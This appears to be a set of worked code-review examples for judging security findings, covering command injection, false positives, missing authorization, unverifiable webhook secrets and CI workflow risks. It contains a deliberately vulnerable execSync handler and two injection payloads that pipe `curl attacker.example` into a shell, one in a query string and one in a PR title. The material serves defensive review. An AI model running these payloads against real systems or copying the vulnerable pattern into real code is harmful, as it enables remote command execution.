# Security review examples

Use these cases to distinguish an exploitable path from a best-practice preference. Paths,
workflows, and snippets are illustrative inputs, not repository requirements. Apply the
shared severity rubric to the consequence established in the actual review.

## A real vulnerability: interpolated shell command

Request: review a PR that adds a web service endpoint returning commit history for a
repository.

```ts
app.get("/history", (req, res) => {
  const output = execSync(`git log --oneline ${req.query.ref}`).toString();
  res.send(output);
});
```

`ref` comes from an unauthenticated request's query string. Trace the value: it reaches the
shell without validation, so a remote caller can send `?ref=main;curl attacker.example|sh`
to execute arbitrary commands with the server's privileges, crossing from an untrusted
network client into the service process.

Report a BLOCKER with origin `introduced`: location, the request-to-shell path, the
resulting command execution, and the direction of passing arguments as an array to a
non-shell spawn or validating `ref` against an allowlist of Git ref syntax. Do not publish
a working payload beyond the minimal demonstration.

## A false positive: parameterized query and test fixture

Request: review a change that builds a query with string concatenation and commits a file
containing `AWS_SECRET_ACCESS_KEY=example`.

Trace both. The concatenated fragment is a column name chosen from a fixed allowlist, and
the values are bound as parameters. The key lives in a test fixture, matches the provider's
documented placeholder, and is never loaded outside tests.

Report no finding for either. Record in `context` the mitigations relied on so the caller
can verify them. A pattern that looks dangerous is not a defect until the path is shown.

## A pre-existing weakness inside the reviewed scope

Request: review a PR that adds a pagination parameter to an existing document endpoint.

The handler already returns any document by identifier without checking that the caller
owns it. The PR does not introduce that gap, but it touches the handler.

Report the missing object-level authorization with origin `pre_existing` and its real
severity. Say explicitly that the change neither introduces nor widens the exposure, so the
caller can decide whether it blocks this PR or becomes separate work. Do not omit it merely
because it is old, and do not attribute it to the change.

## Insufficient context: unverifiable webhook signature

Request: review a webhook handler that compares an incoming signature with a secret
resolved by `config.get("webhookSecret")`.

The configuration loader lives in a package that cannot be inspected, so the review cannot
establish whether the secret is required or defaulted to an empty string, nor how the
signature comparison and payload normalization are implemented. An unset or empty secret
could let any payload pass, but only if the comparison logic also fails to reject it;
neither can be confirmed from what is visible.

Return `incomplete`: preserve any independent findings, state that the secret's source and
the comparison implementation are essential, and name the modules needed. Do not assume a
vulnerability or a mitigation.

## CI: unpinned action

Request: review a workflow change that adds `uses: some-org/setup-tool@v2`.

A mutable tag lets the action's publisher, or anyone who compromises it, change the code
that runs with the job's token. When the repository follows the MiKode continuous
integration standard, cite its pinning rule; do not restate it. Report SHOULD FIX, or
BLOCKER when the job holds write permissions or secrets, and recommend pinning to a
reviewed commit SHA with the version in a comment.

## CI: excessive permissions

Request: review a workflow that sets `permissions: write-all` at the top level so one job
can create a release.

Every job, including those that run tests on contributed code, now holds write access to
contents, packages, and pull requests. Report the broadened token and its consequence for
the jobs that do not need it. Recommend a read-only default with the minimal write scopes
declared on the releasing job only.

## CI: unsafe `pull_request_target`

Request: review a workflow triggered by `pull_request_target` that declares
`permissions: write-all`, exposes a deployment token as a step environment variable, and
checks out `${{ github.event.pull_request.head.sha }}` before running `pnpm install` and
the test script.

Trace the job's `permissions` block and secret exposure before concluding impact: this job
holds the write token and the deployment secret, while the checkout and lifecycle scripts
execute code controlled by the fork author. Report a BLOCKER: any contributor can
exfiltrate the secret or push with the workflow's token. Recommend running untrusted code
under `pull_request` with read-only permissions, and keeping `pull_request_target` for
steps that never check out or execute the contribution. If the job instead held only
read-only permissions and no secrets, downgrade or drop this finding: the trigger alone is
not sufficient evidence of a privileged path.

## CI: untrusted input in a shell step and untrusted artifacts

Request: review a step that runs `echo "Title: ${{ github.event.pull_request.title }}"`.

The expression is expanded before the shell parses the script, so a title containing
`"; curl attacker.example | sh; echo "` executes in the runner. Report the injection and
recommend passing the value through an environment variable. Apply the same reasoning to
a privileged workflow that downloads an artifact produced by an untrusted run and executes
or publishes its contents without validation.

## A change with no security impact

Request: review a diff that renames an internal function and updates its call sites.

Inspection confirms unchanged inputs, privileges, outputs, dependencies, and workflows.
Return `not_applicable` with that reason. For an explicit current-state security review of
the same module, inspect its trust boundaries and return `complete` if no weakness is
found; a small scope does not justify skipping the review.
